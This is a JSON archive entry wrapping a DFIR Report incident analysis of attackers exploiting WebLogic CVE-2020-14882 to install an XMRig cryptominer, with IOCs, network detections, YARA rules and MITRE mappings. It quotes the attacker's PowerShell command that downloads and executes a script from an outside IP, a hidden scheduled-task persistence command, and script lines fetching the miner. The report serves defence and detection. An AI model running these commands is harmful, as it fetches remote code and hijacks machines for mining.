# 0-raw-data/ORKL/library/jsons_entries/6b6ee9b6-93a8-48b4-8770-e088f82ee112.json
{
    "id": "6b6ee9b6-93a8-48b4-8770-e088f82ee112",
    "created_at": "2023-01-12T15:10:45.863283Z",
    "updated_at": "2025-03-27T02:06:10.375763Z",
    "deleted_at": null,
    "sha1_hash": "c143679e7cc134e285346070dec14c71e1be3320",
    "title": "2020-11-12 - Cryptominers Exploiting WebLogic RCE CVE-2020-14882",
    "authors": "",
    "file_creation_date": "2022-05-28T18:02:43Z",
    "file_modification_date": "2022-05-28T18:02:43Z",
    "file_size": 307494,
    "plain_text": "# Cryptominers Exploiting WebLogic RCE CVE-2020-14882\n\n**[thedfirreport.com/2020/11/12/cryptominers-exploiting-weblogic-rce-cve-2020-14882/](https://thedfirreport.com/2020/11/12/cryptominers-exploiting-weblogic-rce-cve-2020-14882/)**\n\nNovember 12, 2020\n\n### Intro\n\n#### Towards the end of October, we started seeing attackers take advantage of a WebLogic RCE vulnerability (CVE-2020-14882). Recently, SANS ISC talked about this vulnerability being exploited in the wild, which you can read about here and here. This vulnerability is very easy to exploit and we assume ransomware actors are using this currently or will be soon.\n\n### Case Summary\n\n#### A threat actor exploited CVE-2020-14882 by making a call to the images directory, which allowed them to execute code on the server. Using this exploit, they downloaded and executed an xml file, which included a PowerShell command to download and execute a script. The script does multiple things, such as download XMRig and its config, rename XMRig to sysupdate, schedule a task for it’s update process, and confirm the miner is running.\n\n### MITRE ATT&CK\n\n\n-----\n\n### Initial Access\n\n#### The threat actor executed an xml file named wbw hosted at 95.142.39[.]135 by exploiting CVE-2020-14882.\n\n### Execution\n\n#### In the above screenshot, the threat actor executes wbw.xml which then downloads and executes 1.ps1.\n```\npowershell.exe \"Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object\nSystem.Net.WebClient).DownloadString('http://95.142.39.135/1.ps1'))\"\n\n The script starts off by setting parameters, such as the download locations for XMRig and its config.\n\n The script then downloads and executes XMRig, renames it to sysupdate and then sets a schedule task, which runs update.ps1. There was no script located in this directory but we assume one would show up when the miner needed to be updated, if the threat actor still had access.\n\n```\n\n-----\n\n```\n\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /TN \"Update service for Windows\nService\" /TR \"PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File\nC:\\Users\\Administrator\\update.ps1\" /MO 30 /F\n\n### Defense Evasion\n\n#### The script renamed xmrig.exe to sysupdate in attempt to hide itself.\n\n### Impact\n\n#### The server’s CPU was maxed out at 100% and likely would have caused issues in an enterprise environment. At the time of this writing the wallet used for mining barely had anything in it and appears to be dedicated to us.\n\n Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank you for your support!\n\n We also have pcaps (exploit pcap), files, memory images, and Kape packages available here.\n\n## IOCs\n\n#### https://misppriv.circl.lu/events/view/81020# & https://otx.alienvault.com/pulse/5fac81c53f59e8b0157fca9f\n\n### Network\n\n#### IPs exploiting CVE-2020-14882\n\n```\n\n-----\n\n```\n212.8.247.179\n95.214.11.231\n95.215.108.217\n\n#### Miner connections\n178.128.242.134:443\n45.136.244.146:3333\n185.92.222.223:443\n37.59.44.193:3333\n94.23.23.52:3333\n104.140.244.186:3333\n\n### File\nxmrig.exe\n57f0fdec4d919db0bd4576dc84aec752\n82e6af04eadb5fac25fbb89dc6f020da0f4b6dca\n5e5b5171a95955ecb0fa8f9f1ba66f313165044cc1978a447673c0ac17859170\n1.ps1\n70000d52dc3ad153464dc41891c10439\n9bd2bc3f87d4c9d029a4e6391358f776e86ad2d5\n58bb90f11070a114442c4fa1cbbccefadcdf954510ae2b8d91c9b22b1a8a42d5\nwbw.xml\nfe0f332ed847a25a18cd63dfdaf69908\n67ff54a71dfc5b817fbc6e62c6c30e9a30219fb9\nc8fd12490f9251080803a68e26a1bdb1919811334ec54ab194645bd516adf1c1\nconfig.json\n2d9a06afe4263530b900aa1c96a84665\n0c86e66105645700b08d33e793362de41d0b1878\n6be51ca6e829c4033d74feff743bcc0d3dc26cb13f687fe6c0d2f6169a8197b2\n\n## Detections\n\n### Network\nET POLICY Cryptocurrency Miner Checkin\nET INFO Dotted Quad Host PS1 Request\nET WEB_SERVER Double Encoded Characters in URI (../)\nET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1\nET HUNTING Powershell Downloader with Start-Process Inbound M1\nET INFO PowerShell Hidden Window Command Common In Powershell Stagers M1\n\n Sigma\n\n#### https://github.com/Neo23x0/sigma/blob/de5444a81e770ec730aa5e3af69781ab222f021a/rule s/windows/powershell/powershell_suspicious_invocation_specific.yml\n\n### Yara\n\n```\n\n-----\n\n```\n/                                          \n  YARA Rule Set                                   \n  Author: The DFIR Report                              \n  Date: 2020-11-09                                 \n  Identifier: 1008_miner                              \n  Reference: https://thedfirreport.com\n*/                                          \n/* Rule Set ----------------------------------------------------------------- */   \nimport \"pe\"rule sig_1008_miner_xmrig {\n  meta:\n   description = \"1008_miner - file xmrig.exe\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2020-11-09\"\n   hash1 = \"5e5b5171a95955ecb0fa8f9f1ba66f313165044cc1978a447673c0ac17859170\"\n  strings:\n   $x1 = \"api-ms-win-core-synch-l1-2-0.dll\" fullword wide /* reversed goodware\nstring 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */\n   $s2 = \"* The error occured in hwloc %s inside process `%s', while\" fullword\nascii\n   $s3 = \"__kernel void find_shares(__global const uint64_t* hashes,__global const\nuint32_t* filtered_hashes,uint64_t target,__global uint\" ascii\n   $s4 = \"__kernel void find_shares(__global const uint64_t* hashes,uint64_t\ntarget,uint32_t start_nonce,__global uint32_t* shares)\" fullword ascii\n   $s5 = \"__kernel void find_shares(__global const uint64_t* hashes,__global const\nuint32_t* filtered_hashes,uint64_t target,__global uint\" ascii\n   $s6 = \"Could not read dumped cpuid file %s, ignoring cpuiddump.\" fullword ascii\n   $s7 = \"%PROGRAMFILES%\\\\NVIDIA Corporation\\\\NVSMI\\\\nvml.dll\" fullword ascii\n   $s8 = \"void blake2b_512_process_single_block(ulong *h,const ulong* m,uint\nblockTemplateSize)\" fullword ascii\n   $s9 = \"* the input XML was generated by hwloc %s inside process `%s'.\" fullword\nascii\n   $s10 = \"blake2b_512_process_single_block(hash,m,blockTemplateSize);\" fullword\nascii\n   $s11 = \"nicehash.com\" fullword ascii\n   $s12 = \"__kernel void progpow_search(__global dag_t const* g_dag,__global uint*\njob_blob,ulong target,uint hack_false,volatile __global \" ascii\n   $s13 = \"__kernel void blake2b_initial_hash(__global void *out,__global const\nvoid* blockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\n   $s14 = \"* hwloc %s received invalid information from the operating system.\"\nfullword ascii\n   $s15 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n   $s16 = \"[email protected]@@\" fullword ascii\n   $s17 = \"__local exec_t* execution_plan=(__local exec_t*)(execution_plan_buf+\n(get_local_id(0)/8)*RANDOMX_PROGRAM_SIZE*WORKERS_PER_HASH*si\" ascii\n   $s18 = \"__kernel void execute_vm(__global void* vm_states,__global void*\nrounding,__global void* scratchpads,__global const void* datase\" ascii\n   $s19 = \"__kernel void progpow_search(__global dag_t const* g_dag,__global uint*\njob_blob,ulong target,uint hack_false,volatile __global \" ascii\n   $s20 = \"__kernel void blake2b_initial_hash(__global void *out,__global const\nvoid* blockTemplate,uint blockTemplateSize,uint start_nonce\" ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 13000KB and\n   ( pe.imphash() == \"85614ad7b23a2780453c1947d2a3d660\" or ( 1 of ($x*) or 4 of\n\n```\n\n-----\n\n```\nthem ) )\n}rule sig_1008_miner_1_pwsh {\n  meta:\n   description = \"1008_miner - file 1.ps1\"\n   author = \"The DFIR Report\"\n   reference = \"https://thedfirreport.com\"\n   date = \"2020-11-09\"\n   hash1 = \"58bb90f11070a114442c4fa1cbbccefadcdf954510ae2b8d91c9b22b1a8a42d5\"\n  strings:\n   $x1 = \"SchTasks.exe /Create /SC MINUTE /TN \\\"Update service for Windows\nService\\\" /TR \\\"PowerShell.exe -ExecutionPolicy bypass -windows\" ascii\n   $x2 = \"SchTasks.exe /Create /SC MINUTE /TN \\\"Update service for Windows\nService\\\" /TR \\\"PowerShell.exe -ExecutionPolicy bypass -windows\" ascii\n   $s3 = \"if(!(Get-Process $miner_name -ErrorAction SilentlyContinue))\" fullword\nascii\n   $s4 = \"echo F | xcopy /y $payload_path $HOME\\\\update.ps1\" fullword ascii\n   $s5 = \"Get-Process -Name $proc_name | Stop-Process\" fullword ascii\n   $s6 = \"Start-Process $miner_path -windowstyle hidden\" fullword ascii\n   $s7 = \"$payload_path = \\\"$env:TMP\\\\update.ps1\\\"\" fullword ascii\n   $s8 = \"$vc.DownloadFile($payload_url_backup,$payload_path)\" fullword ascii\n   $s9 = \"$miner_url_backup = \\\"http://95.142.39.135/xmrig.exe\\\"\" fullword ascii\n   $s10 = \"$miner_url = \\\"http://95.142.39.135/xmrig.exe\\\"\" fullword ascii\n   $s11 = \"$vc.DownloadFile($payload_url,$payload_path)\" fullword ascii\n   $s12 = \"e hidden -File $HOME\\\\update.ps1\\\" /MO 30 /F\" fullword ascii\n   $s13 = \"$miner_cfg_url_backup = \\\"http://95.142.39.135/config.json\\\"\" fullword\nascii\n   $s14 = \"$miner_cfg_url = \\\"http://95.142.39.135/config.json\\\"\" fullword ascii\n   $s15 = \"$miner_path = \\\"$env:TMP\\\\sysupdate.exe\\\"\" fullword ascii\n   $s16 = \"$vc = New-Object System.Net.WebClient\" fullword ascii\n   $s17 = \"Remove-Item $payload_path\" fullword ascii\n   $s18 = \"if((Get-Item $miner_path).length -ne $miner_size)\" fullword ascii\n   $s19 = \"if((Get-Item $miner_cfg_path).length -ne $miner_cfg_size)\" fullword\nascii\n   $s20 = \"Write-Output \\\"download with backurl\\\"\" fullword ascii\n  condition:\n   uint16(0) == 0x6e24 and filesize < 6KB and\n   1 of ($x*) and 4 of them\n}\n\n## MITRE\nExploit Public-Facing Application - T1190 \nCommand-Line Interface - T1059 \nCommand and Scripting Interpreter - T1059 \nScheduled Task - T1053.005 \nResource Hijacking - T1496 \nMasquerading - T1036\n\n#### Internal case 1009\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-12 - Cryptominers Exploiting WebLogic RCE CVE-2020-14882.pdf"
    ],
    "report_names": [
        "2020-11-12 - Cryptominers Exploiting WebLogic RCE CVE-2020-14882.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536245,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1653760963,
    "ts_modification_date": 1653760963,
    "files": {
        "pdf": "https://archive.orkl.eu/c143679e7cc134e285346070dec14c71e1be3320.pdf",
        "text": "https://archive.orkl.eu/c143679e7cc134e285346070dec14c71e1be3320.txt",
        "img": "https://archive.orkl.eu/c143679e7cc134e285346070dec14c71e1be3320.jpg"
    }
}